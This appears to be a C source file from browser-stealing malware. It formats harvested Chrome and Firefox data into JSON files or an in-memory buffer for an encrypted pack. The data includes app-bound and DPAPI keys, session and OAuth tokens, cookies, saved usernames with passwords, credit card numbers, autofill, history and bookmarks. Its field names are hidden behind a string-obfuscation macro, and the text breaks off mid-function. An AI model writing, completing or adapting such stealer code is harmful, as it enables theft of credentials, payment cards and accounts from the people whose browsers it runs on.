#include "Headers.h"

#define ASCII_JSON_WRITE(STR) WriteFile(hFile, STR, lstrlenA(STR), &dwWritten, NULL)

static VOID EscapeJsonString(IN LPCSTR pszInput, OUT LPSTR pszOutput, IN DWORD dwOutputSize)
{
    DWORD dwOut = 0;

    if (!pszInput || !pszOutput || dwOutputSize == 0)
        return;

    while (*pszInput && dwOut < dwOutputSize - 2)
    {
        switch (*pszInput)
        {
            case '"':  if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = '"'; }  break;
            case '\\': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = '\\'; } break;
            case '\b': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'b'; }  break;
            case '\f': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'f'; }  break;
            case '\n': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'n'; }  break;
            case '\r': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 'r'; }  break;
            case '\t': if (dwOut + 2 < dwOutputSize) { pszOutput[dwOut++] = '\\'; pszOutput[dwOut++] = 't'; }  break;
            default:
                if ((UCHAR)*pszInput >= 0x20)
                    pszOutput[dwOut++] = *pszInput;
                break;
        }
        pszInput++;
    }
    pszOutput[dwOut] = '\0';
}

static VOID WriteJsonString(IN HANDLE hFile, IN LPCSTR pszValue)
{
    DWORD   dwWritten   = 0;
    LPSTR   pszEscaped  = NULL;
    DWORD   dwLen       = 0;

    if (!pszValue)
    {
        WriteFile(hFile, "null", 4, &dwWritten, NULL);
        return;
    }

    dwLen = lstrlenA(pszValue) * 2 + 1;
    if (!(pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen)))
    {
        WriteFile(hFile, "null", 4, &dwWritten, NULL);
        return;
    }

    EscapeJsonString(pszValue, pszEscaped, dwLen);

    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    WriteFile(hFile, pszEscaped, lstrlenA(pszEscaped), &dwWritten, NULL);
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);

    HEAP_FREE(pszEscaped);
}

static VOID WriteJsonBinaryAsString(IN HANDLE hFile, IN PBYTE pbData, IN DWORD dwLen)
{
    DWORD   dwWritten       = 0;
    LPSTR   pszEscaped      = NULL;
    DWORD   dwEscapedLen    = 0;

    if (!pbData || dwLen == 0)
    {
        WriteFile(hFile, "\"\"", 2, &dwWritten, NULL);
        return;
    }

    // Check if printable
    BOOL bPrintable = TRUE;
    for (DWORD i = 0; i < dwLen && bPrintable; i++)
    {
        if (pbData[i] < 0x20 && pbData[i] != '\t' && pbData[i] != '\n' && pbData[i] != '\r')
            bPrintable = FALSE;
        if (pbData[i] == 0x7F)
            bPrintable = FALSE;
    }

    if (bPrintable)
    {
        dwEscapedLen = dwLen * 2 + 1;
        if ((pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEscapedLen)))
        {
            // Null-terminate temporarily
            LPSTR pszTemp = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen + 1);
            if (pszTemp)
            {
                RtlCopyMemory(pszTemp, pbData, dwLen);
                pszTemp[dwLen] = '\0';
                EscapeJsonString(pszTemp, pszEscaped, dwEscapedLen);
                HEAP_FREE(pszTemp);

                WriteFile(hFile, "\"", 1, &dwWritten, NULL);
                WriteFile(hFile, pszEscaped, lstrlenA(pszEscaped), &dwWritten, NULL);
                WriteFile(hFile, "\"", 1, &dwWritten, NULL);
            }
            HEAP_FREE(pszEscaped);
            return;
        }
    }

    // Write as hex string
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    for (DWORD i = 0; i < dwLen; i++)
    {
        CHAR szHex[3];
        wsprintfA(szHex, "%02X", pbData[i]);
        WriteFile(hFile, szHex, 2, &dwWritten, NULL);
    }
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
}

static VOID WriteJsonHex(IN HANDLE hFile, IN PBYTE pbData, IN DWORD dwLen)
{
    DWORD dwWritten = 0;

    if (!pbData || dwLen == 0)
    {
        WriteFile(hFile, "\"\"", 2, &dwWritten, NULL);
        return;
    }

    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
    for (DWORD i = 0; i < dwLen; i++)
    {
        CHAR szHex[3];
        wsprintfA(szHex, "%02X", pbData[i]);
        WriteFile(hFile, szHex, 2, &dwWritten, NULL);
    }
    WriteFile(hFile, "\"", 1, &dwWritten, NULL);
}

static VOID WriteJsonDword(IN HANDLE hFile, IN DWORD dwValue)
{
    CHAR    szNum[BUFFER_SIZE_16]   = { 0 };
    DWORD   dwWritten               = 0;

    StringCchPrintfA(szNum, BUFFER_SIZE_16, "%lu", dwValue);
    WriteFile(hFile, szNum, lstrlenA(szNum), &dwWritten, NULL);
}

static VOID WriteJsonTimestamp(IN HANDLE hFile, IN INT64 llTimestamp)
{
    CHAR        szFormatted[BUFFER_SIZE_64] = { 0 };
    DWORD       dwWritten                   = 0;
    FILETIME    FileTime                    = { 0 };
    SYSTEMTIME  SystemTime                  = { 0 };
    INT64       llAdjusted                  = 0;

    if (llTimestamp == 0)
    {
        ASCII_JSON_WRITE("null");
        return;
    }

    if (llTimestamp > 11644473600000000LL)
    {
        // WebKit/Chrome timestamp: microseconds since Jan 1, 1601
        llAdjusted = llTimestamp * 10;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }
    else
    {
        // Unix timestamp: seconds since Jan 1, 1970
        llAdjusted = (llTimestamp + 11644473600LL) * 10000000LL;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }

    if (FileTimeToSystemTime(&FileTime, &SystemTime) && SystemTime.wYear >= 1970 && SystemTime.wYear <= 2100)
    {
        StringCchPrintfA(szFormatted, BUFFER_SIZE_64, "\"%04d-%02d-%02d %02d:%02d:%02d\"", 
            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
        WriteFile(hFile, szFormatted, lstrlenA(szFormatted), &dwWritten, NULL);
    }
    else
    {
        ASCII_JSON_WRITE("null");
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN DWORD dwMaxEntries)
{
    HANDLE  hFile                   = INVALID_HANDLE_VALUE;
    DWORD   dwWritten               = 0;
    DWORD   dwCount                 = 0;
    CHAR    szNum[BUFFER_SIZE_64]   = { 0 };

    if (!pChromiumData || !pszFilePath)
        return FALSE;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileA Failed For '%s' With Error: %lu", pszFilePath, GetLastError());
        return FALSE;
    }

    // Write UTF-8 BOM
    WriteFile(hFile, "\xEF\xBB\xBF", 3, &dwWritten, NULL);

    ASCII_JSON_WRITE("{\n");

    // Firefox-only data
    if (pChromiumData->pFireFoxBrsrData)
    {
        ASCII_JSON_WRITE(OBFA_S("  \"firefox_account\": {\n"));

        ASCII_JSON_WRITE(OBFA_S("    \"master_key\": "));
        WriteJsonHex(hFile, pChromiumData->pFireFoxBrsrData->pbMasterKey, pChromiumData->pFireFoxBrsrData->dwMasterKeyLen);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"email\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szEmail);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"uid\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szUid);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"verified\": "));
        ASCII_JSON_WRITE(pChromiumData->pFireFoxBrsrData->bVerified ? "true" : "false");
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"session_token\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSessionToken);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"sync_oauth_token\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSyncOAuthToken);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"profile_oauth_token\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szProfileOAuthToken);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"send_tab_private_key\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey);
        ASCII_JSON_WRITE(",\n");

        ASCII_JSON_WRITE(OBFA_S("    \"close_tab_private_key\": "));
        WriteJsonString(hFile, pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey);
        ASCII_JSON_WRITE("\n");

        ASCII_JSON_WRITE("  },\n");
    }
    else
    {
        // App-Bound Key (V20)
        ASCII_JSON_WRITE(OBFA_S("  \"app_bound_key\": "));
        WriteJsonHex(hFile, pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen);
        ASCII_JSON_WRITE(",\n");

        // DPAPI Key (V10)
        ASCII_JSON_WRITE(OBFA_S("  \"dpapi_key\": "));
        WriteJsonHex(hFile, pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen);
        ASCII_JSON_WRITE(",\n");

        // Tokens
        dwCount = min(pChromiumData->dwTokenCount, dwMaxEntries);
        ASCII_JSON_WRITE(OBFA_S("  \"tokens\": [\n"));
        for (DWORD i = 0; i < dwCount; i++)
        {
            ASCII_JSON_WRITE("    {\n");
            ASCII_JSON_WRITE(OBFA_S("      \"service\": ")); WriteJsonString(hFile, pChromiumData->pTokens[i].pszService); ASCII_JSON_WRITE(",\n");
            ASCII_JSON_WRITE(OBFA_S("      \"token\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE(",\n");
            ASCII_JSON_WRITE(OBFA_S("      \"bind_key\": ")); WriteJsonHex(hFile, pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE("\n");
            ASCII_JSON_WRITE("    }");
            if (i < dwCount - 1) ASCII_JSON_WRITE(",");
            ASCII_JSON_WRITE("\n");
        }
        ASCII_JSON_WRITE("  ],\n");
    }

    // Cookies
    dwCount = min(pChromiumData->dwCookieCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"cookies\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"host\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszHostKey); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"path\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszPath); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pCookies[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"expires_utc\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n");

    // Logins
    dwCount = min(pChromiumData->dwLoginCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"logins\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"origin_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"action_url\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"username\": ")); WriteJsonString(hFile, pChromiumData->pLogins[i].pszUsername); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"password\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateCreated); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"date_last_used\": ")); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n");

    // Credit Cards
    dwCount = min(pChromiumData->dwCreditCardCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"credit_cards\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"name_on_card\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"nickname\": ")); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"card_number\": ")); WriteJsonBinaryAsString(hFile, pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"expiration_month\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"expiration_year\": ")); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"date_modified\": ")); WriteJsonTimestamp(hFile, pChromiumData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n");

    // Autofill
    dwCount = min(pChromiumData->dwAutofillCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"autofill\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"value\": ")); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszValue); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"count\": ")); WriteJsonDword(hFile, pChromiumData->pAutofill[i].dwCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"date_created\": ")); WriteJsonTimestamp(hFile, pChromiumData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n");

    // History
    dwCount = min(pChromiumData->dwHistoryCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"history\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"title\": ")); WriteJsonString(hFile, pChromiumData->pHistory[i].pszTitle); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"visit_count\": ")); WriteJsonDword(hFile, pChromiumData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"last_visit_time\": ")); WriteJsonTimestamp(hFile, pChromiumData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ],\n");

    // Bookmarks
    dwCount = min(pChromiumData->dwBookmarkCount, dwMaxEntries);
    ASCII_JSON_WRITE(OBFA_S("  \"bookmarks\": [\n"));
    for (DWORD i = 0; i < dwCount; i++)
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE(OBFA_S("      \"name\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"url\": ")); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE(OBFA_S("      \"date_added\": ")); WriteJsonTimestamp(hFile, pChromiumData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ASCII_JSON_WRITE("  ]\n");

    ASCII_JSON_WRITE("}\n");

    CloseHandle(hFile);

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _JSON_BUFFER 
{
    PBYTE   pbData;
    DWORD   dwSize;
    DWORD   dwCapacity;
} JSON_BUFFER, * PJSON_BUFFER;


static BOOL JsonBufferInit(OUT PJSON_BUFFER pBuf, IN DWORD dwInitialCapacity)
{
    if (!pBuf || dwInitialCapacity == 0)
        return FALSE;

    if (!(pBuf->pbData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwInitialCapacity)))
        return FALSE;

    pBuf->dwSize = 0x00;
    pBuf->dwCapacity = dwInitialCapacity;

    return TRUE;
}

static VOID JsonBufferFree(IN PJSON_BUFFER pBuf)
{
    if (!pBuf) return;

    if (pBuf->pbData)
    {
        RtlSecureZeroMemory(pBuf->pbData, pBuf->dwSize);
        HEAP_FREE(pBuf->pbData);
    }

    pBuf->dwSize = 0x00;
    pBuf->dwCapacity = 0x00;
}

static BOOL JsonBufferWrite(IN OUT PJSON_BUFFER pBuf, IN LPCSTR pszData, IN DWORD dwLen)
{
    DWORD   dwNewCapacity   = 0x00;
    PBYTE   pbNewData       = NULL;

    if (!pBuf || !pBuf->pbData || !pszData || dwLen == 0)
        return FALSE;

    if (pBuf->dwSize + dwLen > pBuf->dwCapacity)
    {
#define GROWTH_FACTOR 2
        dwNewCapacity = (pBuf->dwCapacity + dwLen) * GROWTH_FACTOR;
#undef GROWTH_FACTOR
        
        if (!(pbNewData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity)))
            return FALSE;

        RtlCopyMemory(pbNewData, pBuf->pbData, pBuf->dwSize);
        HEAP_FREE(pBuf->pbData);
        
        pBuf->pbData        = pbNewData;
        pBuf->dwCapacity    = dwNewCapacity;
    }

    RtlCopyMemory(pBuf->pbData + pBuf->dwSize, pszData, dwLen);
    pBuf->dwSize += dwLen;

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define JSON_BUF_WRITE(pBuf, STR)    JsonBufferWrite(pBuf, STR, lstrlenA(STR))

static VOID WriteJsonStringToBuf(IN OUT PJSON_BUFFER pBuf, IN LPCSTR pszValue)
{
    LPSTR   pszEscaped  = NULL;
    DWORD   dwLen       = 0x00;

    if (!pszValue)
    {
        JSON_BUF_WRITE(pBuf, "null");
        return;
    }

    dwLen = lstrlenA(pszValue) * 2 + 1;
    if (!(pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen)))
    {
        JSON_BUF_WRITE(pBuf, "null");
        return;
    }

    EscapeJsonString(pszValue, pszEscaped, dwLen);

    JSON_BUF_WRITE(pBuf, "\"");
    JsonBufferWrite(pBuf, pszEscaped, lstrlenA(pszEscaped));
    JSON_BUF_WRITE(pBuf, "\"");

    HEAP_FREE(pszEscaped);
}

static VOID WriteJsonBinaryAsStringToBuf(IN OUT PJSON_BUFFER pBuf, IN PBYTE pbData, IN DWORD dwLen)
{
    LPSTR   pszEscaped      = NULL;
    LPSTR   pszTemp         = NULL;
    DWORD   dwEscapedLen    = 0x00;
    BOOL    bPrintable      = TRUE;
    CHAR    szHex[3]        = { 0 };

    if (!pbData || dwLen == 0)
    {
        JSON_BUF_WRITE(pBuf, "\"\"");
        return;
    }

    for (DWORD i = 0; i < dwLen && bPrintable; i++)
    {
        if (pbData[i] < 0x20 && pbData[i] != '\t' && pbData[i] != '\n' && pbData[i] != '\r')
            bPrintable = FALSE;
        if (pbData[i] == 0x7F)
            bPrintable = FALSE;
    }

    if (bPrintable)
    {
        dwEscapedLen = dwLen * 2 + 1;
        if ((pszEscaped = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEscapedLen)))
        {
            if ((pszTemp = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen + 1)))
            {
                RtlCopyMemory(pszTemp, pbData, dwLen);
                pszTemp[dwLen] = '\0';
                EscapeJsonString(pszTemp, pszEscaped, dwEscapedLen);
                HEAP_FREE(pszTemp);

                JSON_BUF_WRITE(pBuf, "\"");
                JsonBufferWrite(pBuf, pszEscaped, lstrlenA(pszEscaped));
                JSON_BUF_WRITE(pBuf, "\"");
            }
            HEAP_FREE(pszEscaped);
            return;
        }
    }

    JSON_BUF_WRITE(pBuf, "\"");
    for (DWORD i = 0; i < dwLen; i++)
    {
        wsprintfA(szHex, "%02X", pbData[i]);
        JsonBufferWrite(pBuf, szHex, 2);
    }
    JSON_BUF_WRITE(pBuf, "\"");
}

static VOID WriteJsonHexToBuf(IN OUT PJSON_BUFFER pBuf, IN PBYTE pbData, IN DWORD dwLen)
{
    CHAR szHex[3] = { 0 };

    if (!pbData || dwLen == 0)
    {
        JSON_BUF_WRITE(pBuf, "\"\"");
        return;
    }

    JSON_BUF_WRITE(pBuf, "\"");
    for (DWORD i = 0; i < dwLen; i++)
    {
        wsprintfA(szHex, "%02X", pbData[i]);
        JsonBufferWrite(pBuf, szHex, 2);
    }
    JSON_BUF_WRITE(pBuf, "\"");
}

static VOID WriteJsonDwordToBuf(IN OUT PJSON_BUFFER pBuf, IN DWORD dwValue)
{
    CHAR szNum[BUFFER_SIZE_16] = { 0 };

    StringCchPrintfA(szNum, BUFFER_SIZE_16, "%lu", dwValue);
    JsonBufferWrite(pBuf, szNum, lstrlenA(szNum));
}

static VOID WriteJsonTimestampToBuf(IN OUT PJSON_BUFFER pBuf, IN INT64 llTimestamp)
{
    CHAR        szFormatted[BUFFER_SIZE_64] = { 0 };
    FILETIME    FileTime                    = { 0 };
    SYSTEMTIME  SystemTime                  = { 0 };
    INT64       llAdjusted                  = 0x00;

    if (llTimestamp == 0)
    {
        JSON_BUF_WRITE(pBuf, "null");
        return;
    }

    if (llTimestamp > 11644473600000000LL)
    {
        llAdjusted = llTimestamp * 10;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }
    else
    {
        llAdjusted = (llTimestamp + 11644473600LL) * 10000000LL;
        FileTime.dwLowDateTime = (DWORD)(llAdjusted & 0xFFFFFFFF);
        FileTime.dwHighDateTime = (DWORD)(llAdjusted >> 32);
    }

    if (FileTimeToSystemTime(&FileTime, &SystemTime) && SystemTime.wYear >= 1970 && SystemTime.wYear <= 2100)
    {
        StringCchPrintfA(szFormatted, BUFFER_SIZE_64, "\"%04d-%02d-%02d %02d:%02d:%02d\"",
            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond);
        JsonBufferWrite(pBuf, szFormatted, lstrlenA(szFormatted));
    }
    else
    {
        JSON_BUF_WRITE(pBuf, "null");
    }
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define ASCII_JSON_WRITE_TO_MEM(STR) JsonBufferWrite(&JsonBuf, STR, lstrlenA(STR))

BOOL WriteChromiumDataToEncJsonPack(IN PCHROMIUM_DATA pChromiumData, IN PENCRYPTED_JSON_PACK pPack, IN LPCSTR pszFilename, IN DWORD dwMaxEntries)
{
    BOOL        bResult     = FALSE;
    JSON_BUFFER JsonBuf     = { 0 };
    DWORD       dwCount     = 0x00;

    if (!pChromiumData || !pPack || !pszFilename)
        return FALSE;

    if (!JsonBufferInit(&JsonBuf, 4096))
        return FALSE;

    // UTF-8 BOM
    JsonBufferWrite(&JsonBuf, "\xEF\xBB\xBF", 3);

    ASCII_JSON_WRITE_TO_MEM("{\n");

    // Firefox-only data
    if (pChromiumData->pFireFoxBrsrData)
    {
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"firefox_account\": {\n"));

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"master_key\": "));
        WriteJsonHexToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->pbMasterKey, pChromiumData->pFireFoxBrsrData->dwMasterKeyLen);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"email\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szEmail);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"uid\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szUid);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"verified\": "));
        ASCII_JSON_WRITE_TO_MEM(pChromiumData->pFireFoxBrsrData->bVerified ? "true" : "false");
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"session_token\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szSessionToken);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"sync_oauth_token\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szSyncOAuthToken);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"profile_oauth_token\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szProfileOAuthToken);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"send_tab_private_key\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey);
        ASCII_JSON_WRITE_TO_MEM(",\n");

        ASCII_JSON_WRITE_TO_MEM(OBFA_S("    \"close_tab_private_key\": "));
        WriteJsonStringToBuf(&JsonBuf, pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey);
        ASCII_JSON_WRITE_TO_MEM("\n");

        ASCII_JSON_WRITE_TO_MEM("  },\n");
    }
    else
    {
        ASCII_JSON_WRITE_TO_MEM(OBFA_S("  \"app_bound_key\": "));
